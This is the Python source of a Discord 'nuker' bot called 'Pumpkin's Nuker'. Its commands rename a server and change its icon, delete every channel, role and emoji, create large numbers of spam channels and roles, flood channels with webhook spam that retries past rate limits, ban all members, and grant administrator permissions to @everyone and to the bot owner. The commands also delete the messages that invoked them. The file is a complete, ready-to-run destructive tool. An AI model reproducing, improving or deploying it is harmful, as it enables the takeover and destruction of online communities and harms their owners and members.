import discord
from discord.ext import commands
import json
import random
import colorama
import aiohttp
import sys
import asyncio
import requests
import os
import time
import itertools
from colorama import Fore
from discord import Permissions
from discord.ext import commands

colorama.init()


with open('config.json', 'r') as file:
    config = json.load(file)
  
  
embedColor = 0x5c92ff
colors = {"main": Fore.CYAN,
          "white": Fore.WHITE,
          "red": Fore.RED}
msgs = {"info": f"{colors['white']}[{colors['main']}i{colors['white']}]",
        "+": f"{colors['white']}[{colors['main']}+{colors['white']}]",
        "error": f"{colors['white']}[{colors['red']}e{colors['white']}]",
        "input": f"{colors['white']}{colors['main']}>>{colors['white']}",
        "pressenter": f"{colors['white']}[{colors['main']}i{colors['white']}] Press ENTER to exit"}
        

TOKEN = config['token']
GUILD_IDS = config['guild_ids']
ADMIN_ROLE_NAME = config['admin_role_name']
SPAM_ROLES_NAME = config['spam_roles_name']
OWNER_ID = config['owner_id']
NUM_CHANNELS = config['num_channels']
NUM_ROLES = config['num_roles']




intents = discord.Intents.all()
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f"\n\n{colors['main']}" + ("═"*75).center(95) + f"\n{colors['white']}" + 
          f"Logged in as {bot.user}".center(95) + "\n" +
          f"Prefix: {bot.command_prefix}".center(95) + "\n" +
          f"Total servers: {len(bot.guilds)}".center(95) + "\n" +
          f"Total members: {len(bot.users)} ".center(95) + f"\n{colors['main']}" + ("═"*75).center(95) + f"\n\n{colors['white']}")
    print("Connected Servers: ")
    for guild in bot.guilds:
        print(guild.name)

def is_owner():
    async def predicate(ctx):
        return ctx.author.id == OWNER_ID
    return commands.check(predicate)


@bot.command(name="3")
async def spam(ctx):
    with open('config.json', 'r') as file:
        config = json.load(file)

    messages_per_channel = config['messages_per_channel']
    rest_time = config['rest_time']
    message_content = config['message_content']
    webhook_names = config['webhook_names']  

    guild = ctx.guild
    channels = guild.text_channels

    print("Spamming process started.")

    try:
        async with aiohttp.ClientSession() as session:
            webhook_list = []
            for channel in channels:
                webhook = await channel.create_webhook(name=webhook_names[0]) 
                webhook_list.append(webhook)
                await asyncio.sleep(1)  

            for _ in range(20):  
                for _ in range(messages_per_channel):
                    embed = discord.Embed(
                        title='Spam',
                        description=message_content
                    )
                    tasks = []
                    for webhook in webhook_list:
                        
                        tasks.append(webhook.send(content=message_content, embed=embed))

                    while True:
                        try:
                            
                            await asyncio.gather(*tasks)
                            break 
                        except aiohttp.ClientResponseError as e:
                            if e.status == 429:  
                                print("Rate limited! Retrying after exponential backoff...")
                                retry_after = int(e.headers.get('Retry-After', '1'))
                                await asyncio.sleep(retry_after + 1)
                                print("Continuing spamming...")  
                            else:
                                print("Error sending webhook message:", e) 
                                raise  

                    await asyncio.sleep(rest_time)

            for webhook in webhook_list:
                await webhook.delete()

    except aiohttp.ClientError as e:
        print(f"Error sending webhook message: {e}")
        


@bot.command(name="1")
@is_owner()
async def nuke(ctx):
    try:
        
        await ctx.message.delete()

        for guild_id in GUILD_IDS:
            guild = bot.get_guild(guild_id)
            
            if guild is None:
                print(f'Failed to find guild with ID {guild_id}')
                continue
        try:
                await guild.edit(name=config['new_guild_name'])
                with open(config['new_guild_icon'], 'rb') as f:
                    await guild.edit(icon=f.read())
                print(f'Changed guild name and icon in {guild.name}')
                
                deleted_channels = []
                deleted_roles = []
                
                
                await delete_roles(guild, deleted_roles)
                await delete_channels(guild, deleted_channels)
                

                tasks = [
                    spam_channels(guild, NUM_CHANNELS, deleted_channels),
                    spam_roles(guild, NUM_ROLES, deleted_roles)
                ]
                
                await asyncio.gather(*tasks)
                
                print(f'Deleted text channels in {guild.name}: {deleted_channels}')
                print(f'Deleted roles in {guild.name}: {deleted_roles}')
                
        except Exception as e:
                print(f'Error in guild {guild.name}: {e}')
        
        print('All actions completed')
    except Exception as e:
        print(f'Error in nuke command: {e}')
      

async def delete_roles(guild, deleted_roles):
    try:
        print(f'Deleting roles in {guild.name}')
        for role in guild.roles:
            if role != guild.default_role:
                await role.delete()
                deleted_roles.append(role.name)
                print(f'Deleted role: {role.name}')
        print(f'All roles deleted in {guild.name}')
    except Exception as e:
        print(f'Error deleting roles in {guild.name}: {e}')

async def delete_channels(guild, deleted_channels):
    try:
        print(f'Deleting channels in {guild.name}')
        for channel in guild.channels:
            await channel.delete()
            if isinstance(channel, discord.TextChannel):
                deleted_channels.append(channel.name)
                print(f'Deleted channel: {channel.name}')
        print(f'All channels deleted in {guild.name}')
    except Exception as e:
        print(f'Error deleting channels in {guild.name}: {e}')

async def spam_channels(guild, num_channels, deleted_channels):
    try:
        channel_names = [config['spam_channels_name_1'], config['spam_channels_name_2']]
        for _ in range(num_channels):
            channel_name = random.choice(channel_names)
            channel = await guild.create_text_channel(name=channel_name)
            deleted_channels.append(channel.name)
            print(f'Spam text channel created in {guild.name}: {channel.name}')
    except Exception as e:
        print(f'Error creating spam text channels in {guild.name}: {e}')
      


async def spam_roles(guild, num_roles, deleted_roles):
    try:
        for _ in range(num_roles):
            role_name = config['spam_roles_name']
            role = await guild.create_role(name=role_name)
            deleted_roles.append(role.name)
            print(f'Spam role created in {guild.name}: {role.name}')
    except Exception as e:
        print(f'Error creating spam roles in {guild.name}: {e}')



@bot.command(name="6")
@is_owner()
@commands.has_permissions(manage_roles=True)
async def adminall(ctx):
    await ctx.message.delete()
    role = ctx.guild.default_role
    permissions = discord.Permissions.all()
    await role.edit(permissions=permissions)
    print(f'All permissions granted to @everyone')


@bot.command(name="5")
@is_owner()
async def emojidelete(ctx):
  await ctx.message.delete()
  for emoji in list(ctx.guild.emojis):
    try:
      await emoji.delete()
      print(f"successfully deleted emoji {emoji.name}!")
    except Exception as e:
      print(f"error deleting emoji {emoji.name}!: {e}")


@bot.command(name="4")
@is_owner()
async def getadmin(ctx):
    try:
        guild = ctx.guild

        admin_role = discord.utils.get(guild.roles, name=ADMIN_ROLE_NAME)
        if admin_role is None:
            admin_role = await guild.create_role(name=ADMIN_ROLE_NAME, permissions=discord.Permissions.all())
            print(f'Admin role created in {guild.name}')

        owner = guild.get_member(OWNER_ID)
        await owner.add_roles(admin_role)
        print(f'Admin role given to bot owner in {guild.name}')

        try:
            await ctx.message.delete()
        except discord.NotFound:
            print("Command message not found.")

    except Exception as e:
        print(f'Error in admin command: {e}')
        
       
@bot.command(name="2")
@is_owner()
async def banall(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild

        members = []
        async for member in guild.fetch_members(limit=None):
            members.append(member)

        for member in members:
            if member == guild.me or member == guild.owner or member.id == OWNER_ID:
                continue

            await guild.ban(member)
            print(f'Banned member: {member.name}')

        print("Banning process completed.")
    except Exception as e:
        print(f'Error banning people in {guild.name}: {e}')


@bot.command()
@is_owner()
async def cmd(ctx):
    embed = discord.Embed(title="Pumpkin's Nuker", description='List of available commands:', color=discord.Color.blue())

    embed.add_field(name='!1', value="change server's name, icon, delete channels, delete roles, create channels, create roles. ", inline=False)
    embed.add_field(name="!2", value="ban members", inline=False)
    embed.add_field(name="!3", value="spam messages", inline=False)
    embed.add_field(name='!4', value='gives an admin role to the owner of the bot', inline=False)
    embed.add_field(name='!5', value='deletes all emoji in the server', inline=False)
    embed.add_field(name='!6', value='gives administrator perm to everyone', inline=False)
    embed.add_field(name="\u200b\nInfo", value=">>> **Pumpkin's Nuker**\nMade by <@800689202588811294>\nGitHub: https://github.com/FriendlyPumpkin/Pumpkin", inline=False)
  
    await ctx.author.send(embed=embed)

bot.run(TOKEN)
